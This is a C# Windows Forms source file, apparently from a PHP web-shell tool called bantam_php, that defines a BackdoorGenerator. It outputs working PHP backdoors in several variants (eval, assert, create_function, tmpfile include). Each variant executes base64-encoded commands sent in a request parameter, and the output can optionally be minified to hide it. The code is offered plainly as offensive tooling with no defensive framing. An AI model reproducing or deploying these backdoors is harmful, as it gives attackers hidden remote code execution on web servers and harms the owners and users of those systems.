﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace bantam_php
{
    public partial class BackdoorGenerator : Form
    {
        /// <summary>
        /// 
        /// </summary>
        public BackdoorGenerator()
        {
            InitializeComponent();
            comboBox1.SelectedIndex = 0;
            richTextBox1.Text = generateBackdoor();
        }

        /// <summary>
        /// 
        /// </summary>
        public enum BackdoorTypes
        {
            EVAL = 0,
            ASSERT,
            CREATE_FUNCTION,
            NATIVE_ANON,
            TMP_INCLUDE,
            PREG_REPLACE
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="varName"></param>
        /// <returns></returns>
        public string generateBackdoor(string varName = "command", BackdoorTypes backdoorType = BackdoorTypes.EVAL)
        {
            string backdoor = "";
            switch(backdoorType)
            {
                case BackdoorTypes.EVAL:
                    {
                        backdoor = "<?php \r\nif(isset($_REQUEST['" + varName + "'])) {\r\n\t@eval(@urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n}";
                        break;
                    }

                case BackdoorTypes.ASSERT:
                    {
                        backdoor = "<?php \r\nif(isset($_REQUEST['" + varName + "'])) {\r\n\t@assert(@urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n}";
                        break;
                    }

                case BackdoorTypes.CREATE_FUNCTION:
                    {
                        backdoor = "<?php \r\nif(isset($_REQUEST['" + varName + "'])) {\r\n\t$a=@create_function(null, @urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n\t$a();\r\n}";
                        break;
                    }

                case BackdoorTypes.NATIVE_ANON:
                    {
                        //TODO
                        //backdoor = "";
                        break;
                    }

                case BackdoorTypes.TMP_INCLUDE:
                    {
                        backdoor = "<?php \r\nif(isset($_REQUEST['" + varName + "'])) {\r\n\t$fp = tmpfile();\r\n\t$tmpf=stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\tfwrite($fp, '<?php '.@urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n\tinclude($tmpf);\r\n\tfclose($fp);\r\n}";
                        break;
                    }

                case BackdoorTypes.PREG_REPLACE:
                    {
                        //TODO
                        backdoor = "";
                        break;
                    }
            }

            if (chkbxMinifyCode.Checked)
            {
                backdoor = PHP_Helper.minifyCode(backdoor);
            }
            return backdoor;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            richTextBox1.Text = generateBackdoor(txtBoxVarName.Text, (BackdoorTypes)comboBox1.SelectedIndex);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void txtBoxVarName_TextChanged(object sender, EventArgs e)
        {
            richTextBox1.Text = generateBackdoor(txtBoxVarName.Text, (BackdoorTypes)comboBox1.SelectedIndex);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void chkbxUseCookie_CheckStateChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void chkbxDisableLogging_CheckStateChanged(object sender, EventArgs e)
        {

        }

        private void chkbxMinifyCode_CheckedChanged(object sender, EventArgs e)
        {
            if (chkbxMinifyCode.Checked)
            {
                richTextBox1.Text = PHP_Helper.minifyCode(generateBackdoor(txtBoxVarName.Text, (BackdoorTypes)comboBox1.SelectedIndex));
            }
            else
            {
                richTextBox1.Text = generateBackdoor(txtBoxVarName.Text, (BackdoorTypes)comboBox1.SelectedIndex);
            }
        }
    }
}